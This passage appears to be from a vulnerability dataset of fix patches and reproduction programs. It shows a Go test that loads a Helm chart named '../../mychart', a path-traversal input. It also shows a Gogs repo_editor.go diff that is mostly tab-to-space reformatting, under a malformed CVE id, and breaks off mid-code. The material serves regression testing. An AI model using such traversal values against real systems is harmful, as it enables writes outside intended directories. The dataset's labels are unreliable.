/dev/null\n+++ b/repro/repro.go\n@@ -0,0 +1,39 @@\n+package main\n+\n+import (\n+\"fmt\"\n+\"log\"\n+\"os\"\n+\n+\"helm.sh/helm/v3/pkg/chart/loader\"\n+)\n+\n+func main() {\n+// Create a temporary directory for the chart\n+chartDir, err := os.MkdirTemp(\"\", \"chart\")\n+if err != nil {\n+log.Fatal(err)\n+}\n+defer os.RemoveAll(chartDir)\n+\n+// Create a Chart.yaml file with a malicious name\n+chartYaml := `\n+apiVersion: v2\n+name: ../../mychart\n+version: 0.1.0\n+`\n+if err := os.WriteFile(chartDir+\"/Chart.yaml\", []byte(chartYaml), 0644); err != nil {\n+log.Fatal(err)\n+}\n+\n+// Load the chart\n+_, err = loader.Load(chartDir)\n+if err != nil {\n+// This is the expected outcome after the fix\n+fmt.Printf(\"Successfully prevented loading the chart: %s\\n\", err)\n+os.Exit(0)\n+}\n+\n+fmt.Println(\"Vulnerability Confirmed: chart was loaded successfully.\")\n+os.Exit(1)\n+}\n"}
{"cve":"CVE-2022-2024:0708", "fix_patch": "diff --git a/internal/db/repo_editor.go b/internal/db/repo_editor.go\nindex 3edb16e2..bee13c79 100644\n--- a/internal/db/repo_editor.go\n+++ b/internal/db/repo_editor.go\n@@ -5,65 +5,65 @@\n package db\n \n import (\n-\t\"fmt\"\n-\t\"io\"\n-\t\"mime/multipart\"\n-\t\"os\"\n-\t\"os/exec\"\n-\t\"path\"\n-\t\"path/filepath\"\n-\t\"strings\"\n-\t\"time\"\n-\n-\t\"github.com/pkg/errors\"\n-\tgouuid \"github.com/satori/go.uuid\"\n-\t\"github.com/unknwon/com\"\n-\n-\t\"github.com/gogs/git-module\"\n-\n-\t\"gogs.io/gogs/internal/conf\"\n-\t\"gogs.io/gogs/internal/cryptoutil\"\n-\tdberrors \"gogs.io/gogs/internal/db/errors\"\n-\t\"gogs.io/gogs/internal/gitutil\"\n-\t\"gogs.io/gogs/internal/osutil\"\n-\t\"gogs.io/gogs/internal/pathutil\"\n-\t\"gogs.io/gogs/internal/process\"\n-\t\"gogs.io/gogs/internal/tool\"\n+        \"fmt\"\n+        \"io\"\n+        \"mime/multipart\"\n+        \"os\"\n+        \"os/exec\"\n+        \"path\"\n+        \"path/filepath\"\n+        \"strings\"\n+        \"time\"\n+\n+        \"github.com/pkg/errors\"\n+        gouuid \"github.com/satori/go.uuid\"\n+        \"github.com/unknwon/com\"\n+\n+        \"github.com/gogs/git-module\"\n+\n+        \"gogs.io/gogs/internal/conf\"\n+        \"gogs.io/gogs/internal/cryptoutil\"\n+        dberrors \"gogs.io/gogs/internal/db/errors\"\n+        \"gogs.io/gogs/internal/gitutil\"\n+        \"gogs.io/gogs/internal/osutil\"\n+        \"gogs.io/gogs/internal/pathutil\"\n+        \"gogs.io/gogs/internal/process\"\n+        \"gogs.io/gogs/internal/tool\"\n )\n \n const (\n-\tENV_AUTH_USER_ID           = \"GOGS_AUTH_USER_ID\"\n-\tENV_AUTH_USER_NAME         = \"GOGS_AUTH_USER_NAME\"\n-\tENV_AUTH_USER_EMAIL        = \"GOGS_AUTH_USER_EMAIL\"\n-\tENV_REPO_OWNER_NAME        = \"GOGS_REPO_OWNER_NAME\"\n-\tENV_REPO_OWNER_SALT_MD5    = \"GOGS_REPO_OWNER_SALT_MD5\"\n-\tENV_REPO_ID                = \"GOGS_REPO_ID\"\n-\tENV_REPO_NAME              = \"GOGS_REPO_NAME\"\n-\tENV_REPO_CUSTOM_HOOKS_PATH = \"GOGS_REPO_CUSTOM_HOOKS_PATH\"\n+        ENV_AUTH_USER_ID           = \"GOGS_AUTH_USER_ID\"\n+        ENV_AUTH_USER_NAME         = \"GOGS_AUTH_USER_NAME\"\n+        ENV_AUTH_USER_EMAIL        = \"GOGS_AUTH_USER_EMAIL\"\n+        ENV_REPO_OWNER_NAME        = \"GOGS_REPO_OWNER_NAME\"\n+        ENV_REPO_OWNER_SALT_MD5    = \"GOGS_REPO_OWNER_SALT_MD5\"\n+        ENV_REPO_ID                = \"GOGS_REPO_ID\"\n+        ENV_REPO_NAME              = \"GOGS_REPO_NAME\"\n+        ENV_REPO_CUSTOM_HOOKS_PATH = \"GOGS_REPO_CUSTOM_HOOKS_PATH\"\n )\n \n type ComposeHookEnvsOptions struct {\n-\tAuthUser  *User\n-\tOwnerName string\n-\tOwnerSalt string\n-\tRepoID    int64\n-\tRepoName  string\n-\tRepoPath  string\n+        AuthUser  *User\n+        OwnerName string\n+        OwnerSalt string\n+        RepoID    int64\n+        RepoName  string\n+        RepoPath  string\n }\n \n func ComposeHookEnvs(opts ComposeHookEnvsOptions) []string {\n-\tenvs := []string{\n-\t\t\"SSH_ORIGINAL_COMMAND=1\",\n-\t\tENV_AUTH_USER_ID + \"=\" + com.ToStr(opts.AuthUser.ID),\n-\t\tENV_AUTH_USER_NAME + \"=\" + opts.AuthUser.Name,\n-\t\tENV_AUTH_USER_EMAIL + \"=\" + opts.AuthUser.Email,\n-\t\tENV_REPO_OWNER_NAME + \"=\" + opts.OwnerName,\n-\t\tENV_REPO_OWNER_SALT_MD5 + \"=\" + cryptoutil.MD5(opts.OwnerSalt),\n-\t\tENV_REPO_ID + \"=\" + com.ToStr(opts.RepoID),\n-\t\tENV_REPO_NAME + \"=\" + opts.RepoName,\n-\t\tENV_REPO_CUSTOM_HOOKS_PATH + \"=\" + filepath.Join(opts.RepoPath, \"custom_hooks\"),\n-\t}\n-\treturn envs\n+        envs := []string{\n+                \"SSH_ORIGINAL_COMMAND=1\",\n+                ENV_AUTH_USER_ID + \"=\" + com.ToStr(opts.AuthUser.ID),\n+                ENV_AUTH_USER_NAME + \"=\" + opts.AuthUser.Name,\n+                ENV_AUTH_USER_EMAIL + \"=\" + opts.AuthUser.Email,\n+                ENV_REPO_OWNER_NAME + \"=\" + opts.OwnerName,\n+                ENV_REPO_OWNER_SALT_MD5 + \"=\" + cryptoutil.MD5(opts.OwnerSalt),\n+                ENV_REPO_ID + \"=\" + com.ToStr(opts.RepoID),\n+                ENV_REPO_NAME + \"=\" + opts.RepoName,\n+                ENV_REPO_CUSTOM_HOOKS_PATH + \"=\" + filepath.Join(opts.RepoPath, \"custom_hooks\"),\n+        }\n+        return envs\n }\n \n // ___________    .___.__  __    ___________.__.__\n@@ -76,194 +76,194 @@ func ComposeHookEnvs(opts ComposeHookEnvsOptions) []string {\n // discardLocalRepoBranchChanges discards local commits/changes of\n // given branch to make sure it is even to remote branch.\n func discardLocalRepoBranchChanges(localPath, branch string) error {\n-\tif !com.IsExist(localPath) {\n-\t\treturn nil\n-\t}\n-\n-\t// No need to check if nothing in the repository.\n-\tif !git.RepoHasBranch(localPath, branch) {\n-\t\treturn nil\n-\t}\n-\n-\trev := \"origin/\" + branch\n-\tif err := git.Reset(localPath, rev, git.ResetOptions{Hard: true}); err != nil {\n-\t\treturn fmt.Errorf(\"reset [revision: %s]: %v\", rev, err)\n-\t}\n-\treturn nil\n+        if !com.IsExist(localPath) {\n+                return nil\n+        }\n+\n+        // No need to check if nothing in the repository.\n+        if !git.RepoHasBranch(localPath, branch) {\n+                return nil\n+        }\n+\n+        rev := \"origin/\" + branch\n+        if err := git.Reset(localPath, rev, git.ResetOptions{Hard: true}); err != nil {\n+                return fmt.Errorf(\"reset [revision: %s]: %v\", rev, err)\n+        }\n+        return nil\n }\n \n func (repo *Repository) DiscardLocalRepoBranchChanges(branch string) error {\n-\treturn discardLocalRepoBranchChanges(repo.LocalCopyPath(), branch)\n+        return discardLocalRepoBranchChanges(repo.LocalCopyPath(), branch)\n }\n \n // CheckoutNewBranch checks out to a new branch from the a branch name.\n func (repo *Repository) CheckoutNewBranch(oldBranch, newBranch string) error {\n-\tif err := git.Checkout(repo.LocalCopyPath(), newBranch, git.CheckoutOptions{\n-\t\tBaseBranch: oldBranch,\n-\t\tTimeout:    time.Duration(conf.Git.Timeout.Pull) * time.Second,\n-\t}); err != nil {\n-\t\treturn fmt.Errorf(\"checkout [base: %s, new: %s]: %v\", oldBranch, newBranch, err)\n-\t}\n-\treturn nil\n+        if err := git.Checkout(repo.LocalCopyPath(), newBranch, git.CheckoutOptions{\n+                BaseBranch: oldBranch,\n+                Timeout:    time.Duration(conf.Git.Timeout.Pull) * time.Second,\n+        }); err != nil {\n+                return fmt.Errorf(\"checkout [base: %s, new: %s]: %v\", oldBranch, newBranch, err)\n+        }\n+        return nil\n }\n \n type UpdateRepoFileOptions struct {\n-\tOldBranch   string\n-\tNewBranch   string\n-\tOldTreeName string\n-\tNewTreeName string\n-\tMessage     string\n-\tContent     string\n-\tIsNewFile   bool\n+        OldBranch   string\n+        NewBranch   string\n+        OldTreeName string\n+        NewTreeName string\n+        Message     string\n+        Content     string\n+        IsNewFile   bool\n }\n \n // UpdateRepoFile adds or updates a file in repository.\n func (repo *Repository) UpdateRepoFile(doer *User, opts UpdateRepoFileOptions) (err error) {\n-\t// \ud83d\udea8 SECURITY: Prevent uploading files into the \".git\" directory\n-\tif isRepositoryGitPath(opts.NewTreeName) {\n-\t\treturn errors.Errorf(\"bad tree path %q\", opts.NewTreeName)\n-\t}\n-\n-\trepoWorkingPool.CheckIn(com.ToStr(repo.ID))\n-\tdefer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n-\n-\tif err = repo.DiscardLocalRepoBranchChanges(opts.OldBranch); err != nil {\n-\t\treturn fmt.Errorf(\"discard local repo branch[%s] changes: %v\", opts.OldBranch, err)\n-\t} else if err = repo.UpdateLocalCopyBranch(opts.OldBranch); err != nil {\n-\t\treturn fmt.Errorf(\"update local copy branch[%s]: %v\", opts.OldBranch, err)\n-\t}\n-\n-\trepoPath := repo.RepoPath()\n-\tlocalPath := repo.LocalCopyPath()\n-\n-\tif opts.OldBranch != opts.NewBranch {\n-\t\t// Directly return error if new branch already exists in the server\n-\t\tif git.RepoHasBranch(repoPath, opts.NewBranch) {\n-\t\t\treturn dberrors.BranchAlreadyExists{Name: opts.NewBranch}\n-\t\t}\n-\n-\t\t// Otherwise, delete branch from local copy in case out of sync\n-\t\tif git.RepoHasBranch(localPath, opts.NewBranch) {\n-\t\t\tif err = git.DeleteBranch(localPath, opts.NewBranch, git.DeleteBranchOptions{\n-\t\t\t\tForce: true,\n-\t\t\t}); err != nil {\n-\t\t\t\treturn fmt.Errorf(\"delete branch %q: %v\", opts.NewBranch, err)\n-\t\t\t}\n-\t\t}\n-\n-\t\tif err := repo.CheckoutNewBranch(opts.OldBranch, opts.NewBranch); err != nil {\n-\t\t\treturn fmt.Errorf(\"checkout new branch[%s] from old branch[%s]: %v\", opts.NewBranch, opts.OldBranch, err)\n-\t\t}\n-\t}\n-\n-\toldFilePath := path.Join(localPath, opts.OldTreeName)\n-\tfilePath := path.Join(localPath, opts.NewTreeName)\n-\tif err = os.MkdirAll(path.Dir(filePath), os.ModePerm); err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// If it's meant to be a new file, make sure it doesn't exist.\n-\tif opts.IsNewFile {\n-\t\tif com.IsExist(filePath) {\n-\t\t\treturn ErrRepoFileAlreadyExist{filePath}\n-\t\t}\n-\t}\n-\n-\t// Ignore move step if it's a new file under a directory.\n-\t// Otherwise, move the file when name changed.\n-\tif osutil.IsFile(oldFilePath) && opts.OldTreeName != opts.NewTreeName {\n-\t\tif err = git.Move(localPath, opts.OldTreeName, opts.NewTreeName); err != nil {\n-\t\t\treturn fmt.Errorf(\"git mv %q %q: %v\", opts.OldTreeName, opts.NewTreeName, err)\n-\t\t}\n-\t}\n-\n-\tif err = os.WriteFile(filePath, []byte(opts.Content), 0600); err != nil {\n-\t\treturn fmt.Errorf(\"write file: %v\", err)\n-\t}\n-\n-\tif err = git.Add(localPath, git.AddOptions{All: true}); err != nil {\n-\t\treturn fmt.Errorf(\"git add --all: %v\", err)\n-\t}\n-\n-\terr = git.CreateCommit(\n-\t\tlocalPath,\n-\t\t&git.Signature{\n-\t\t\tName:  doer.DisplayName(),\n-\t\t\tEmail: doer.Email,\n-\t\t\tWhen:  time.Now(),\n-\t\t},\n-\t\topts.Message,\n-\t)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"commit changes on %q: %v\", localPath, err)\n-\t}\n-\n-\terr = git.Push(localPath, \"origin\", opts.NewBranch,\n-\t\tgit.PushOptions{\n-\t\t\tCommandOptions: git.CommandOptions{\n-\t\t\t\tEnvs: ComposeHookEnvs(ComposeHookEnvsOptions{\n-\t\t\t\t\tAuthUser:  doer,\n-\t\t\t\t\tOwnerName: repo.MustOwner().Name,\n-\t\t\t\t\tOwnerSalt: repo.MustOwner().Salt,\n-\t\t\t\t\tRepoID:    repo.ID,\n-\t\t\t\t\tRepoName:  repo.Name,\n-\t\t\t\t\tRepoPath:  repo.RepoPath(),\n-\t\t\t\t}),\n-\t\t\t},\n-\t\t},\n-\t)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"git push origin %s: %v\", opts.NewBranch, err)\n-\t}\n-\treturn nil\n+        // \ud83d\udea8 SECURITY: Prevent uploading files into the \".git\" directory\n+        if isRepositoryGitPath(opts.NewTreeName) {\n+                return errors.Errorf(\"bad tree path %q\", opts.NewTreeName)\n+        }\n+\n+        repoWorkingPool.CheckIn(com.ToStr(repo.ID))\n+        defer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n+\n+        if err = repo.DiscardLocalRepoBranchChanges(opts.OldBranch); err != nil {\n+                return fmt.Errorf(\"discard local repo branch[%s] changes: %v\", opts.OldBranch, err)\n+        } else if err = repo.UpdateLocalCopyBranch(opts.OldBranch); err != nil {\n+                return fmt.Errorf(\"update local copy branch[%s]: %v\", opts.OldBranch, err)\n+        }\n+\n+        repoPath := repo.RepoPath()\n+        localPath := repo.LocalCopyPath()\n+\n+        if opts.OldBranch != opts.NewBranch {\n+                // Directly return error if new branch already exists in the server\n+                if git.RepoHasBranch(repoPath, opts.NewBranch) {\n+                        return dberrors.BranchAlreadyExists{Name: opts.NewBranch}\n+                }\n+\n+                // Otherwise, delete branch from local copy in case out of sync\n+                if git.RepoHasBranch(localPath, opts.NewBranch) {\n+                        if err = git.DeleteBranch(localPath, opts.NewBranch, git.DeleteBranchOptions{\n+                                Force: true,\n+                        }); err != nil {\n+                                return fmt.Errorf(\"delete branch %q: %v\", opts.NewBranch, err)\n+                        }\n+                }\n+\n+                if err := repo.CheckoutNewBranch(opts.OldBranch, opts.NewBranch); err != nil {\n+                        return fmt.Errorf(\"checkout new branch[%s] from old branch[%s]: %v\", opts.NewBranch, opts.OldBranch, err)\n+                }\n+        }\n+\n+        oldFilePath := path.Join(localPath, opts.OldTreeName)\n+        filePath := path.Join(localPath, opts.NewTreeName)\n+        if err = os.MkdirAll(path.Dir(filePath), os.ModePerm); err != nil {\n+                return err\n+        }\n+\n+        // If it's meant to be a new file, make sure it doesn't exist.\n+        if opts.IsNewFile {\n+                if com.IsExist(filePath) {\n+                        return ErrRepoFileAlreadyExist{filePath}\n+                }\n+        }\n+\n+        // Ignore move step if it's a new file under a directory.\n+        // Otherwise, move the file when name changed.\n+        if osutil.IsFile(oldFilePath) && opts.OldTreeName != opts.NewTreeName {\n+                if err = git.Move(localPath, opts.OldTreeName, opts.NewTreeName); err != nil {\n+                        return fmt.Errorf(\"git mv %q %q: %v\", opts.OldTreeName, opts.NewTreeName, err)\n+                }\n+        }\n+\n+        if err = os.WriteFile(filePath, []byte(opts.Content), 0600); err != nil {\n+                return fmt.Errorf(\"write file: %v\", err)\n+        }\n+\n+        if err = git.Add(localPath, git.AddOptions{All: true}); err != nil {\n+                return fmt.Errorf(\"git add --all: %v\", err)\n+        }\n+\n+        err = git.CreateCommit(\n+                localPath,\n+                &git.Signature{\n+                        Name:  doer.DisplayName(),\n+                        Email: doer.Email,\n+                        When:  time.Now(),\n+                },\n+                opts.Message,\n+        )\n+        if err != nil {\n+                return fmt.Errorf(\"commit changes on %q: %v\", localPath, err)\n+        }\n+\n+        err = git.Push(localPath, \"origin\", opts.NewBranch,\n+                git.PushOptions{\n+                        CommandOptions: git.CommandOptions{\n+                                Envs: ComposeHookEnvs(ComposeHookEnvsOptions{\n+                                        AuthUser:  doer,\n+                                        OwnerName: repo.MustOwner().Name,\n+                                        OwnerSalt: repo.MustOwner().Salt,\n+                                        RepoID:    repo.ID,\n+                                        RepoName:  repo.Name,\n+                                        RepoPath:  repo.RepoPath(),\n+                                }),\n+                        },\n+                },\n+        )\n+        if err != nil {\n+                return fmt.Errorf(\"git push origin %s: %v\", opts.NewBranch, err)\n+        }\n+        return nil\n }\n \n // GetDiffPreview produces and returns diff result of a file which is not yet committed.\n func (repo *Repository) GetDiffPreview(branch, treePath, content string) (diff *gitutil.Diff, err error) {\n-\trepoWorkingPool.CheckIn(com.ToStr(repo.ID))\n-\tdefer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n-\n-\tif err = repo.DiscardLocalRepoBranchChanges(branch); err != nil {\n-\t\treturn nil, fmt.Errorf(\"discard local repo branch[%s] changes: %v\", branch, err)\n-\t} else if err = repo.UpdateLocalCopyBranch(branch); err != nil {\n-\t\treturn nil, fmt.Errorf(\"update local copy branch[%s]: %v\", branch, err)\n-\t}\n-\n-\tlocalPath := repo.LocalCopyPath()\n-\tfilePath := path.Join(localPath, treePath)\n-\tif err = os.MkdirAll(filepath.Dir(filePath), os.ModePerm); err != nil {\n-\t\treturn nil, err\n-\t}\n-\tif err = os.WriteFile(filePath, []byte(content), 0600); err != nil {\n-\t\treturn nil, fmt.Errorf(\"write file: %v\", err)\n-\t}\n-\n-\tcmd := exec.Command(\"git\", \"diff\", treePath)\n-\tcmd.Dir = localPath\n-\tcmd.Stderr = os.Stderr\n-\n-\tstdout, err := cmd.StdoutPipe()\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"get stdout pipe: %v\", err)\n-\t}\n-\n-\tif err = cmd.Start(); err != nil {\n-\t\treturn nil, fmt.Errorf(\"start: %v\", err)\n-\t}\n-\n-\tpid := process.Add(fmt.Sprintf(\"GetDiffPreview [repo_path: %s]\", repo.RepoPath()), cmd)\n-\tdefer process.Remove(pid)\n-\n-\tdiff, err = gitutil.ParseDiff(stdout, conf.Git.MaxDiffFiles, conf.Git.MaxDiffLines, conf.Git.MaxDiffLineChars)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"parse diff: %v\", err)\n-\t}\n-\n-\tif err = cmd.Wait(); err != nil {\n-\t\treturn nil, fmt.Errorf(\"wait: %v\", err)\n-\t}\n-\n-\treturn diff, nil\n+        repoWorkingPool.CheckIn(com.ToStr(repo.ID))\n+        defer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n+\n+        if err = repo.DiscardLocalRepoBranchChanges(branch); err != nil {\n+                return nil, fmt.Errorf(\"discard local repo branch[%s] changes: %v\", branch, err)\n+        } else if err = repo.UpdateLocalCopyBranch(branch); err != nil {\n+                return nil, fmt.Errorf(\"update local copy branch[%s]: %v\", branch, err)\n+        }\n+\n+        localPath := repo.LocalCopyPath()\n+        filePath := path.Join(localPath, treePath)\n+        if err = os.MkdirAll(filepath.Dir(filePath), os.ModePerm); err != nil {\n+                return nil, err\n+        }\n+        if err = os.WriteFile(filePath, []byte(content), 0600); err != nil {\n+                return nil, fmt.Errorf(\"write file: %v\", err)\n+        }\n+\n+        cmd := exec.Command(\"git\", \"diff\", treePath)\n+        cmd.Dir = localPath\n+        cmd.Stderr = os.Stderr\n+\n+        stdout, err := cmd.StdoutPipe()\n+        if err != nil {\n+                return nil, fmt.Errorf(\"get stdout pipe: %v\", err)\n+        }\n+\n+        if err = cmd.Start(); err != nil {\n+                return nil, fmt.Errorf(\"start: %v\", err)\n+        }\n+\n+        pid := process.Add(fmt.Sprintf(\"GetDiffPreview [repo_path: %s]\", repo.RepoPath()), cmd)\n+        defer process.Remove(pid)\n+\n+        diff, err = gitutil.ParseDiff(stdout, conf.Git.MaxDiffFiles, conf.Git.MaxDiffLines, conf.Git.MaxDiffLineChars)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"parse diff: %v\", err)\n+        }\n+\n+        if err = cmd.Wait(); err != nil {\n+                return nil, fmt.Errorf(\"wait: %v\", err)\n+        }\n+\n+        return diff, nil\n }\n \n // ________         .__          __           ___________.__.__\n@@ -275,69 +275,69 @@ func (repo *Repository) GetDiffPreview(branch, treePath, content string) (diff *\n //\n \n type DeleteRepoFileOptions struct {\n-\tLastCommitID string\n-\tOldBranch    string\n-\tNewBranch    string\n-\tTreePath     string\n-\tMessage      string\n+        LastCommitID string\n+        OldBranch    string\n+        NewBranch    string\n+        TreePath     string\n+        Message      string\n }\n \n func (repo *Repository) DeleteRepoFile(doer *User, opts DeleteRepoFileOptions) (err error) {\n-\trepoWorkingPool.CheckIn(com.ToStr(repo.ID))\n-\tdefer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n-\n-\tif err = repo.DiscardLocalRepoBranchChanges(opts.OldBranch); err != nil {\n-\t\treturn fmt.Errorf(\"discard local repo branch[%s] changes: %v\", opts.OldBranch, err)\n-\t} else if err = repo.UpdateLocalCopyBranch(opts.OldBranch); err != nil {\n-\t\treturn fmt.Errorf(\"update local copy branch[%s]: %v\", opts.OldBranch, err)\n-\t}\n-\n-\tif opts.OldBranch != opts.NewBranch {\n-\t\tif err := repo.CheckoutNewBranch(opts.OldBranch, opts.NewBranch); err != nil {\n-\t\t\treturn fmt.Errorf(\"checkout new branch[%s] from old branch[%s]: %v\", opts.NewBranch, opts.OldBranch, err)\n-\t\t}\n-\t}\n-\n-\tlocalPath := repo.LocalCopyPath()\n-\tif err = os.Remove(path.Join(localPath, opts.TreePath)); err != nil {\n-\t\treturn fmt.Errorf(\"remove file %q: %v\", opts.TreePath, err)\n-\t}\n-\n-\tif err = git.Add(localPath, git.AddOptions{All: true}); err != nil {\n-\t\treturn fmt.Errorf(\"git add --all: %v\", err)\n-\t}\n-\n-\terr = git.CreateCommit(\n-\t\tlocalPath,\n-\t\t&git.Signature{\n-\t\t\tName:  doer.DisplayName(),\n-\t\t\tEmail: doer.Email,\n-\t\t\tWhen:  time.Now(),\n-\t\t},\n-\t\topts.Message,\n-\t)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"commit changes to %q: %v\", localPath, err)\n-\t}\n-\n-\terr = git.Push(localPath, \"origin\", opts.NewBranch,\n-\t\tgit.PushOptions{\n-\t\t\tCommandOptions: git.CommandOptions{\n-\t\t\t\tEnvs: ComposeHookEnvs(ComposeHookEnvsOptions{\n-\t\t\t\t\tAuthUser:  doer,\n-\t\t\t\t\tOwnerName: repo.MustOwner().Name,\n-\t\t\t\t\tOwnerSalt: repo.MustOwner().Salt,\n-\t\t\t\t\tRepoID:    repo.ID,\n-\t\t\t\t\tRepoName:  repo.Name,\n-\t\t\t\t\tRepoPath:  repo.RepoPath(),\n-\t\t\t\t}),\n-\t\t\t},\n-\t\t},\n-\t)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"git push origin %s: %v\", opts.NewBranch, err)\n-\t}\n-\treturn nil\n+        repoWorkingPool.CheckIn(com.ToStr(repo.ID))\n+        defer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n+\n+        if err = repo.DiscardLocalRepoBranchChanges(opts.OldBranch); err != nil {\n+                return fmt.Errorf(\"discard local repo branch[%s] changes: %v\", opts.OldBranch, err)\n+        } else if err = repo.UpdateLocalCopyBranch(opts.OldBranch); err != nil {\n+                return fmt.Errorf(\"update local copy branch[%s]: %v\", opts.OldBranch, err)\n+        }\n+\n+        if opts.OldBranch != opts.NewBranch {\n+                if err := repo.CheckoutNewBranch(opts.OldBranch, opts.NewBranch); err != nil {\n+                        return fmt.Errorf(\"checkout new branch[%s] from old branch[%s]: %v\", opts.NewBranch, opts.OldBranch, err)\n+                }\n+        }\n+\n+        localPath := repo.LocalCopyPath()\n+        if err = os.Remove(path.Join(localPath, opts.TreePath)); err != nil {\n+                return fmt.Errorf(\"remove file %q: %v\", opts.TreePath, err)\n+        }\n+\n+        if err = git.Add(localPath, git.AddOptions{All: true}); err != nil {\n+                return fmt.Errorf(\"git add --all: %v\", err)\n+        }\n+\n+        err = git.CreateCommit(\n+                localPath,\n+                &git.Signature{\n+                        Name:  doer.DisplayName(),\n+                        Email: doer.Email,\n+                        When:  time.Now(),\n+                },\n+                opts.Message,\n+        )\n+        if err != nil {\n+                return fmt.Errorf(\"commit changes to %q: %v\", localPath, err)\n+        }\n+\n+        err = git.Push(localPath, \"origin\", opts.NewBranch,\n+                git.PushOptions{\n+                        CommandOptions: git.CommandOptions{\n+                                Envs: ComposeHookEnvs(ComposeHookEnvsOptions{\n+                                        AuthUser:  doer,\n+                                        OwnerName: repo.MustOwner().Name,\n+                                        OwnerSalt: repo.MustOwner().Salt,\n+                                        RepoID:    repo.ID,\n+                                        RepoName:  repo.Name,\n+                                        RepoPath:  repo.RepoPath(),\n+                                }),\n+                        },\n+                },\n+        )\n+        if err != nil {\n+                return fmt.Errorf(\"git push origin %s: %v\", opts.NewBranch, err)\n+        }\n+        return nil\n }\n \n //  ____ ___        .__                    .___ ___________.___.__\n@@ -350,241 +350,253 @@ func (repo *Repository) DeleteRepoFile(doer *User, opts DeleteRepoFileOptions) (\n \n // Upload represent a uploaded file to a repo to be deleted when moved\n type Upload struct {\n-\tID   int64\n-\tUUID string `xorm:\"uuid UNIQUE\"`\n-\tName string\n+        ID   int64\n+        UUID string `xorm:\"uuid UNIQUE\"`\n+        Name string\n }\n \n // UploadLocalPath returns where uploads is stored in local file system based on given UUID.\n func UploadLocalPath(uuid string) string {\n-\treturn path.Join(conf.Repository.Upload.TempPath, uuid[0:1], uuid[1:2], uuid)\n+        return path.Join(conf.Repository.Upload.TempPath, uuid[0:1], uuid[1:2], uuid)\n }\n \n // LocalPath returns where uploads are temporarily stored in local file system.\n func (upload *Upload) LocalPath() string {\n-\treturn UploadLocalPath(upload.UUID)\n+        return UploadLocalPath(upload.UUID)\n }\n \n // NewUpload creates a new upload object.\n func NewUpload(name string, buf []byte, file multipart.File) (_ *Upload, err error) {\n-\tif tool.IsMaliciousPath(name) {\n-\t\treturn nil, fmt.Errorf(\"malicious path detected: %s\", name)\n-\t}\n-\n-\tupload := &Upload{\n-\t\tUUID: gouuid.NewV4().String(),\n-\t\tName: name,\n-\t}\n-\n-\tlocalPath := upload.LocalPath()\n-\tif err = os.MkdirAll(path.Dir(localPath), os.ModePerm); err != nil {\n-\t\treturn nil, fmt.Errorf(\"mkdir all: %v\", err)\n-\t}\n-\n-\tfw, err := os.Create(localPath)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"create: %v\", err)\n-\t}\n-\tdefer func() { _ = fw.Close() }()\n-\n-\tif _, err = fw.Write(buf); err != nil {\n-\t\treturn nil, fmt.Errorf(\"write: %v\", err)\n-\t} else if _, err = io.Copy(fw, file); err != nil {\n-\t\treturn nil, fmt.Errorf(\"copy: %v\", err)\n-\t}\n-\n-\tif _, err := x.Insert(upload); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\treturn upload, nil\n+        if tool.IsMaliciousPath(name) {\n+                return nil, fmt.Errorf(\"malicious path detected: %s\", name)\n+        }\n+\n+        upload := &Upload{\n+                UUID: gouuid.NewV4().String(),\n+                Name: name,\n+        }\n+\n+        localPath := upload.LocalPath()\n+        if err = os.MkdirAll(path.Dir(localPath), os.ModePerm); err != nil {\n+                return nil, fmt.Errorf(\"mkdir all: %v\", err)\n+        }\n+\n+        fw, err := os.Create(localPath)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"create: %v\", err)\n+        }\n+        defer func() { _ = fw.Close() }()\n+\n+        if _, err = fw.Write(buf); err != nil {\n+                return nil, fmt.Errorf(\"write: %v\", err)\n+        } else if _, err = io.Copy(fw, file); err != nil {\n+                return nil, fmt.Errorf(\"copy: %v\", err)\n+        }\n+\n+        if _, err := x.Insert(upload); err != nil {\n+                return nil, err\n+        }\n+\n+        return upload, nil\n }\n \n func GetUploadByUUID(uuid string) (*Upload, error) {\n-\tupload := &Upload{UUID: uuid}\n-\thas, err := x.Get(upload)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t} else if !has {\n-\t\treturn nil, ErrUploadNotExist{0, uuid}\n-\t}\n-\treturn upload, nil\n+        upload := &Upload{UUID: uuid}\n+        has, err := x.Get(upload)\n+        if err != nil {\n+                return nil, err\n+        } else if !has {\n+                return nil, ErrUploadNotExist{0, uuid}\n+        }\n+        return upload, nil\n }\n \n func GetUploadsByUUIDs(uuids []string) ([]*Upload, error) {\n-\tif len(uuids) == 0 {\n-\t\treturn []*Upload{}, nil\n-\t}\n+        if len(uuids) == 0 {\n+                return []*Upload{}, nil\n+        }\n \n-\t// Silently drop invalid uuids.\n-\tuploads := make([]*Upload, 0, len(uuids))\n-\treturn uploads, x.In(\"uuid\", uuids).Find(&uploads)\n+        // Silently drop invalid uuids.\n+        uploads := make([]*Upload, 0, len(uuids))\n+        return uploads, x.In(\"uuid\", uuids).Find(&uploads)\n }\n \n func DeleteUploads(uploads ...*Upload) (err error) {\n-\tif len(uploads) == 0 {\n-\t\treturn nil\n-\t}\n-\n-\tsess := x.NewSession()\n-\tdefer sess.Close()\n-\tif err = sess.Begin(); err != nil {\n-\t\treturn err\n-\t}\n-\n-\tids := make([]int64, len(uploads))\n-\tfor i := 0; i < len(uploads); i++ {\n-\t\tids[i] = uploads[i].ID\n-\t}\n-\tif _, err = sess.In(\"id\", ids).Delete(new(Upload)); err != nil {\n-\t\treturn fmt.Errorf(\"delete uploads: %v\", err)\n-\t}\n-\n-\tfor _, upload := range uploads {\n-\t\tlocalPath := upload.LocalPath()\n-\t\tif !osutil.IsFile(localPath) {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tif err := os.Remove(localPath); err != nil 